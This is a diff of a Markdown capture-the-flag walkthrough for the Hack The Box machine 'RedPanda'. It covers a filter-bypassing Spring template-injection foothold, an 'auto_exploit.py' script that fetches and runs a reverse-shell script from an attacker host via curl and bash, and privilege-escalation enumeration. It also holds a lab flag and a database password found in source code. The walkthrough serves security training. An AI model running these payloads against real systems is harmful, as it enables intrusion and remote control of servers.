@@ -177,6 +177,7 @@ Test with `Burpsuite Intruder`:
 ![[ssti_injection.png]]
 
 Look like it vulneable with character `#` and `*`.
+# Foothold
 Go to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) to find injection with Java. The tips is we need to use `#` or `*` to bypass the filter.
 
 ## Java
@@ -213,6 +214,7 @@ We found somethings interest with `*`.
 ![[etc.passwd.png]]
 There is user `woodenk` at OS. And the web application is running on user `woodenk`.
 Lets go deeper to find a way to revershell.
+## Revershell
 As above we see that the code only work when the each string have been converted from `asci` char to `char` code.
 Lets try write some code
 
@@ -290,19 +292,16 @@ We got the revershell. Well.
 Lets try to automate full process with `auto_exploit.py`
 ```python
 #!/usr/bin/python3  
-import requests
+import requests  
 IP = '10.10.11.170'  
-port = '8080'  
+PORT = '8080'  
 command = ['whoami','curl -o /tmp/rev.sh http://10.10.14.10:8088/rev.sh', 'bash /tmp/rev.sh']  
 def convert_to_char(c):  
     payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('  
     payload2 = ''  
     payload = payload + "T(java.lang.Character).toString(%s)" % ord(c[0])  
     for i in range(1, len(c)):  
-        char = ""  
-        # print(ord(i))  
-        char = ord(c[i])  
-        payload2 = ".concat(T(java.lang.Character).toString(%s))" % char  
+        payload2 = ".concat(T(java.lang.Character).toString(%s))" % ord(c[i])  
         payload = payload + payload2  
   
     payload = payload + ").getInputStream())}"  
@@ -310,14 +309,62 @@ def convert_to_char(c):
   
 for c in command:  
     d = {'name': convert_to_char(c)}  
-    url = 'http://%s:%s/search' % (IP,port)  
+    url = 'http://%s:%s/search' % (IP,PORT)  
     r = requests.post(url,data = d)  
     print(r.status_code)
 ```
 
+
+open 2 new tab with `http.server 8088` and `rlwrap nc -nvlp 1234`. At the 3 tabs run `python3 auto_exploit.py`
 The `user.txt` flag:
 ```
 efaa8f33e98ff3993b20c6bade76a83a
+```
+
+# Escalate Privilege
+Check the port open with `netstat -tulpn`
+```bash
+woodenk@redpanda:/tmp/hsperfdata_woodenk$ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::8080                 :::*                    LISTEN      887/java
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+woodenk@redpanda:/tmp/hsperfdata_woodenk$
+```
+
+Check the `id,group`
+```bash
+id
+uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
+woodenk@redpanda:/tmp/hsperfdata_woodenk$
+```
+
+Check the process with `pspy64`
+![[pspy64.png]]
+```bash
+2022/08/28 09:06:01 CMD: UID=0    PID=3052   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
+```
+
+Check `linpeas.sh` scripts
+
+There some process
+```bash
+root         884  0.0  0.0   2608   532 ?        Ss   Aug27   0:00      _ /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.j
+ar
+root         885  0.0  0.2   9420  4580 ?        S    Aug27   0:00          _ sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+```
+
+and some weird permission for `syslog`
+```
+uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
 ```
 
 ```bash
@@ -327,4 +374,17 @@ Binary file ./target/classes/com/panda_search/htb/panda_search/MainController.cl
 ./src/main/java/com/panda_search/htb/panda_search/MainController.java:            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
 woodenk@redpanda:/opt/panda_search$
 ```
+
+```mysql
+DB: red_panda
+user: woodenk
+pass: RedpandazRule
+Host: localhost
+Port:3306
+```
+Humm.
+Tried to login to `mysql`. But there no luck.
+Base on gathering info, i think there will be escalate with somethings with term `logs`. (user in `logs` group, and `syslog` user in `adm` group).
+
+There alot of file in `/opt/` directory. I will download the whole to my `kali` machine.
 
